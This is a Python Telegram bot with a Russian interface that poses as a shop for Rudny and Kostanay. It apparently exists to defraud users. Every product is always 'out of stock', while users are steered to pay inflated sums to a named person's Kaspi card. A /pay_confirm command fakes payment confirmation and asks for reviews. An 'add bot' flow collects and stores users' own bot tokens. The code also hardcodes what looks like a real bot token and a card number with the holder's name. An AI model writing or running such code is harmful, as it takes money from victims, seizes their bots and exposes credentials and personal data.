import asyncio
import random
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.client.default import DefaultBotProperties
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

TOKEN = "7863869683:AAHbskO6rwLfPTReQRH3GjzmzqKAsqzmHfg"
bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# Главное меню
main_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="Рудный"), KeyboardButton(text="Костанай")],
        [KeyboardButton(text="Баланс (0 тенге)"), KeyboardButton(text="Мои боты")],
        [KeyboardButton(text="Прайс"), KeyboardButton(text="Бонусы")],
        [KeyboardButton(text="Последний заказ"), KeyboardButton(text="Отзывы (0)")],
        [KeyboardButton(text="Оператор")]
    ],
    resize_keyboard=True
)

add_bot_menu = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="Добавить бота")],
        [KeyboardButton(text="Назад в меню")]
    ],
    resize_keyboard=True
)

amount_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="3500"), KeyboardButton(text="5000")],
        [KeyboardButton(text="10000"), KeyboardButton(text="15000")],
        [KeyboardButton(text="20000"), KeyboardButton(text="25000")],
        [KeyboardButton(text="30000")]
    ],
    resize_keyboard=True, one_time_keyboard=True
)

stars_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="⭐⭐⭐⭐⭐")],
        [KeyboardButton(text="⭐⭐⭐⭐")],
        [KeyboardButton(text="⭐⭐⭐")],
        [KeyboardButton(text="⭐⭐")],
        [KeyboardButton(text="⭐")]
    ],
    resize_keyboard=True, one_time_keyboard=True
)

user_states = {}  # user_id: состояние
user_bots = {}    # user_id: список токенов

@dp.message(Command(commands=["start", "menu"]))
async def start_handler(message: types.Message):
    user_id = message.from_user.id
    if user_id not in user_bots:
        user_bots[user_id] = []
    user_states[user_id] = {
        "balance_request_active": False,
        "balance_amount": None,
        "display_amount": None,
        "awaiting_review": False,
        "awaiting_bot_token": False
    }
    await message.answer("Добро пожаловать! Выберите действие:", reply_markup=main_menu)

@dp.message()
async def main_handler(message: types.Message):
    user_id = message.from_user.id
    text = message.text
    state = user_states.setdefault(user_id, {
        "balance_request_active": False,
        "balance_amount": None,
        "display_amount": None,
        "awaiting_review": False,
        "awaiting_bot_token": False
    })

    if state.get("awaiting_bot_token"):
        if ":" in text and len(text) > 30:
            user_bots[user_id].append(text)
            state["awaiting_bot_token"] = False
            await message.answer("Ваш бот успешно добавлен!", reply_markup=main_menu)
        else:
            await message.answer(
                "Это не похоже на токен бота. Отправьте токен в формате:\n"
                "123456789:ABCDefghIjklMnopQRStuvWxYZ"
            )
        return

    if state.get("awaiting_review"):
        rating = text.strip()
        if rating in ["⭐", "⭐⭐", "⭐⭐⭐", "⭐⭐⭐⭐", "⭐⭐⭐⭐⭐"]:
            await message.answer(f"Спасибо за ваш отзыв {rating}!", reply_markup=main_menu)
            state["awaiting_review"] = False
        else:
            await message.answer("Пожалуйста, выберите рейтинг с помощью кнопок.", reply_markup=stars_keyboard)
        return

    if text == "Оператор":
        await message.answer('<a href="https://t.me/yunglean10">Написать оператору</a>', disable_web_page_preview=True)
    elif text in ["Рудный", "Костанай", "Прайс"]:
        await message.answer("Товар закончился. Зайдите позже")
    elif text == "Последний заказ":
        await message.answer("У вас заказов: 0")
    elif text == "Бонусы":
        await message.answer("У вас нет активных акций")
    elif text == "Мои боты":
        bots_list = user_bots.get(user_id, [])
        if not bots_list:
            await message.answer(
                "Ваши боты:\nУ вас нету ботов!\n\n"
                "Нажмите кнопку ниже, чтобы добавить бота.",
                reply_markup=add_bot_menu
            )
        else:
            bots_text = "\n".join(f"{i+1}. {token[:10]}..." for i, token in enumerate(bots_list))
            await message.answer(
                f"Ваши боты:\n{bots_text}\n\n"
                "Чтобы добавить ещё одного бота, нажмите кнопку ниже.",
                reply_markup=add_bot_menu
            )
    elif text == "Добавить бота":
        await message.answer(
            "Добавить бота:\n1. Зайди в @BotFather\n2. /newbot\n3. Введи имя и username\n"
            "4. Получи токен и отправь его сюда",
            reply_markup=ReplyKeyboardRemove()
        )
        state["awaiting_bot_token"] = True
    elif text == "Назад в меню":
        await message.answer("Возвращаемся в главное меню", reply_markup=main_menu)
    elif text == "Баланс (0 тенге)":
        if state["balance_request_active"]:
            await message.answer(
                f'У вас УЖЕ СОЗДАНА заявка на пополнение, оплатите или ожидайте отмены!\n'
                f'Заявка № 140555517 (4fokadyr8bj6capp).\n'
                f'Переведите {state["display_amount"]} тенге на карту: '
                f'<a href="https://pay.kaspi.kz/">4400 4303 0055 0164 | DANIIL NOVIKOV</a>\n'
                f'Заявка отменится через 30 минут.',
                disable_web_page_preview=True
            )
        else:
            await message.answer("Выберите сумму для пополнения баланса:", reply_markup=amount_keyboard)
    elif text.isdigit() and int(text) >= 3500:
        base_amount = int(text)
        bonus = random.randint(0, 1000)
        display_amount = base_amount + bonus

        state["balance_request_active"] = True
        state["balance_amount"] = display_amount
        state["display_amount"] = display_amount

        await message.answer("Вы выбрали способ пополнения: <b>Kaspi карта</b>")
        await message.answer(
            "✅ Реквизиты действуют 30 минут\n"
            "✅ Переводите точную сумму\n"
            "✅ Одним платёжом\n"
            "✅ Проблемы с оплатой? @yunglean10\n\n"
            f"Предоставьте чек и ID: 4fokadyr8bj6capp\n"
            f"Номер заявки: 140555517 (4fokadyr8bj6capp)\n"
            f"Сумма: <b>{display_amount} тенге</b>\n"
            f'<a href="https://pay.kaspi.kz/">скоро будет карта</a>',
            disable_web_page_preview=True
        )
        asyncio.create_task(cancel_balance_request(user_id))
        await message.answer("Выберите действие:", reply_markup=main_menu)
    elif text == "/pay_confirm":
        if not state["balance_request_active"]:
            await message.answer("У вас нет активной заявки.")
        else:
            await message.answer(f"Оплата на сумму {state['display_amount']} тенге подтверждена!")
            state["balance_request_active"] = False
            state["balance_amount"] = None
            await asyncio.sleep(1)
            await message.answer("Теперь вы можете оставить отзыв. Выберите количество звёзд:", reply_markup=stars_keyboard)
            state["awaiting_review"] = True
    else:
        await message.answer("Выберите пункт из меню или используйте кнопки.")

async def cancel_balance_request(user_id: int):
    await asyncio.sleep(1800)
    state = user_states.get(user_id)
    if state and state.get("balance_request_active"):
        state["balance_request_active"] = False
        state["balance_amount"] = None
        state["display_amount"] = None
        try:
            await bot.send_message(user_id, "Ваша заявка на пополнение отменена из-за отсутствия оплаты.")
        except:
            pass

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(dp.start_polling(bot))
